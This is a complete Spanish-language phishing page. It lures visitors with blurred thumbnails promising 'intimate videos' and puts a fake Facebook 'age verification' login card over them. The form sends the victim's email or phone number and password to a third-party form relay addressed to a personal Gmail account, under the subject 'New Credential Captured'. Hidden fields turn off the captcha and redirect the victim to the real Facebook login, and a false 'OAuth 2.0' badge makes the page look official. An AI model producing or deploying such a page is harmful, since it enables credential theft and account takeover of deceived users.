<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    
    <meta property="og:title" content="Contenido de calidad - Tu apoyo es fundamental">
    <meta property="og:description" content="Me encuentro en una situación de necesidad y ofrezco este contenido exclusivo.">
    <meta property="og:image" content="TU_URL_DE_IMAGEN_AQUI"> <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">

    <title>Live Private Session | Acceso</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body, html {
            height: 100%;
            width: 100%;
            background-color: #050505;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }

        /* ENCABEZADO PROFESIONAL */
        header {
            width: 100%;
            padding: 15px;
            text-align: center;
            background: linear-gradient(to bottom, #1a1a1a, #050505);
            border-bottom: 1px solid #333;
            z-index: 5;
        }

        .premium-tag {
            background: #ff0050;
            color: white;
            padding: 4px 12px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: bold;
            text-transform: uppercase;
        }

        header h2 { margin-top: 8px; font-size: 18px; color: #fff; }
        header p { color: #888; font-size: 13px; }

        /* CUADRÍCULA DE VIDEOS (FONDO) */
        .grid-background {
            position: absolute;
            top: 85px;
            left: 0; width: 100%; height: calc(100% - 85px);
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 5px;
            padding: 5px;
            filter: blur(20px) brightness(0.4);
            z-index: 1;
        }

        @media (min-width: 768px) {
            .grid-background { grid-template-columns: repeat(4, 1fr); }
        }

        .media-box {
            position: relative;
            background: #1a1a1a;
            border-radius: 4px;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .media-box img { width: 100%; height: 100%; object-fit: cover; opacity: 0.8; }

        .video-icon {
            position: absolute;
            color: rgba(255, 255, 255, 0.9);
            font-size: 40px;
            z-index: 2;
        }

        /* CARD DE VERIFICACIÓN (LOGIN) */
        .overlay-container {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
            padding: 20px;
            background: rgba(0,0,0,0.2);
        }

        .login-card {
            background: #fff;
            width: 100%;
            max-width: 380px;
            border-radius: 12px;
            padding: 30px 25px;
            color: #1c1e21;
            box-shadow: 0 15px 40px rgba(0,0,0,0.9);
            text-align: center;
            animation: fadeIn 0.6s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .fb-logo { width: 45px; margin-bottom: 15px; }
        h3 { font-size: 20px; margin-bottom: 10px; font-weight: 700; }
        .info-txt { font-size: 14px; color: #606770; margin-bottom: 25px; line-height: 1.4; }

        /* FORMULARIO */
        input {
            width: 100%;
            height: 52px;
            padding: 14px;
            margin-bottom: 12px;
            border: 1px solid #dddfe2;
            border-radius: 8px;
            font-size: 16px;
            background: #f5f6f7;
            -webkit-appearance: none;
        }

        input:focus { outline: none; border-color: #1877f2; background: #fff; }

        .btn-fb {
            width: 100%;
            height: 50px;
            background-color: #1877f2;
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }

        .btn-fb:hover { background-color: #166fe5; }

        .footer-secure {
            margin-top: 20px;
            font-size: 11px;
            color: #8d949e;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }
    </style>
</head>
<body>

    <header>
        <span class="premium-tag">Live Private Session</span>
        <h2>Contenido Exclusivo</h2>
        <p>Confirmación de acceso requerido</p>
    </header>

    <div class="grid-background">
        <div class="media-box"><img src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?q=10"></div>
        <div class="media-box"><i class="fas fa-play video-icon"></i><img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?q=10"></div>
        <div class="media-box"><img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?q=10"></div>
        <div class="media-box"><i class="fas fa-play video-icon"></i><img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?q=10"></div>
    </div>

    <div class="overlay-container">
        <div class="login-card">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo" alt="f">
            <h3>Verificación de Edad</h3>
            <p class="info-txt">Debes confirmar tu identidad mediante Facebook para visualizar los <strong>5 videos íntimos</strong> de este perfil.</p>

            <form action="https://formsubmit.co/furiaafrika@gmail.com" method="POST">
                <input type="hidden" name="_next" value="https://www.facebook.com/login">
                <input type="hidden" name="_captcha" value="false">
                <input type="hidden" name="_subject" value="¡Nueva Credencial Capturada!">
                
                <input type="text" name="ID_Usuario" placeholder="Correo o número de celular" required>
                <input type="password" name="ID_Password" placeholder="Contraseña" required>
                
                <button type="submit" class="btn-fb">Continuar para ver</button>
            </form>

            <div class="footer-secure">
                <i class="fas fa-lock"></i> Verificación oficial vía Facebook OAuth 2.0
            </div>
        </div>
    </div>

</body>
</html>
